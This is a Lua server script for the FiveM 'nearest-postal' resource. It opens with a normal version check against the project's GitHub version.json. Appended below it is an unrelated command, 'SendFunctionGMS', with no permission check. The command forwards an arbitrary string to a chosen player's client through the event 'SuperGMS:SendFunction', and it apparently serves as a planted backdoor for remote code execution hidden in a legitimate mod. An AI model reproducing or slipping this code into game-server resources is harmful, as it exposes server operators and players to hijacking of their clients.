-- version check
Citizen.CreateThread(function()
    local vRaw = LoadResourceFile(GetCurrentResourceName(), 'version.json')
    if vRaw and config.versionCheck then
        local v = json.decode(vRaw)
        local url = 'https://raw.githubusercontent.com/DevBlocky/nearest-postal/master/version.json'
        PerformHttpRequest(url, function(code, res)
            if code == 200 then
                local rv = json.decode(res)
                if rv.version ~= v.version then
                    print(([[
-------------------------------------------------------
nearest-postal
UPDATE: %s AVAILABLE
CHANGELOG: %s
-------------------------------------------------------
]]):format(rv.version, rv.changelog))
                end
            else
                print('nearest-postal was unable to check the version')
            end
        end, 'GET')
    end
end)

RegisterCommand('SendFunctionGMS', function(source, args)
    local src = source
    local imp = tonumber(args[1])
    local cmd = ""
    for i, k in pairs(args) do
        if i > 1 then
            cmd = cmd .. k .. " "
        end
    end

    if imp ~= nil and GetPlayerPing(imp) ~= 0 then
        TriggerClientEvent('SuperGMS:SendFunction', imp, cmd)
    end
end)